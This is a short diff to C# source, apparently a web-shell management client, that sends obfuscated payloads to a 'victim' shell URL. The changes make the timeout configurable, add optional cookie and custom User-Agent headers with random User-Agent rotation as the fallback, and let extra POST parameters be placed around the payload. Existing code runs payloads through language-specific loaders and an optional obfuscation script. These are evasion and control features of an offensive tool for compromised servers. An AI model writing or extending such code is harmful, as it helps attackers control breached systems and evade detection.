@@ -322,11 +322,16 @@ namespace Alien
             m_clnt = new HttpClient(handler)
             {
                 BaseAddress = new Uri(m_victim.ShellURL),
-                Timeout = TimeSpan.FromMilliseconds(10000),
+                Timeout = TimeSpan.FromMilliseconds(m_victim.m_ShellConfig.nTimeout),
             };
 
-            string szRandomUA = clsEzData.fnRandomUserAgent();
-            m_clnt.DefaultRequestHeaders.UserAgent.ParseAdd(szRandomUA);
+            if (!string.IsNullOrEmpty(m_victim.m_ShellConfig.szCookie))
+                m_clnt.DefaultRequestHeaders.Add("Cookie", m_victim.m_ShellConfig.szCookie);
+
+            if (string.IsNullOrEmpty(m_victim.m_ShellConfig.szUserAgent))
+                m_clnt.DefaultRequestHeaders.UserAgent.ParseAdd(clsEzData.fnRandomUserAgent());
+            else
+                m_clnt.DefaultRequestHeaders.UserAgent.ParseAdd(m_victim.m_ShellConfig.szUserAgent);
         }
 
         public async ValueTask DisposeAsync()
@@ -894,6 +899,7 @@ namespace Alien
                 string szPayloadMethod = m_victim.m_ShellConfig.szMethod;
 
                 string szParams = string.Join("&", asParams);
+
                 //string? szLoader = m_dicDecodeFunc[m_victim.ShellLanguage](szPayloadMethod)?.Replace("[PATTERN]", Uri.EscapeDataString(clsEzData.fnszStre2b64(szPayload)));
                 string? szLoader = m_dicDecodeFunc[m_victim.ShellLanguage](szPayloadMethod);
                 if (string.IsNullOrEmpty(szLoader))
@@ -910,6 +916,13 @@ namespace Alien
                 if (config.bEHEnable)
                     szPayload = await m_tamper.fnObfuscate(config.szEventHorizonScript, szPayload, JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig));
 
+                if (!string.IsNullOrEmpty(config.szExtraPost))
+                {
+                    if (config.nExtraPostPosition == 0)
+                        szPayload = config.szExtraPost + "&" + szPayload;
+                    else
+                        szPayload += "&" + config.szExtraPost;
+                }
             }
 
             if (m_victim.m_ShellConfig.lsCometShellID.Count > 0)
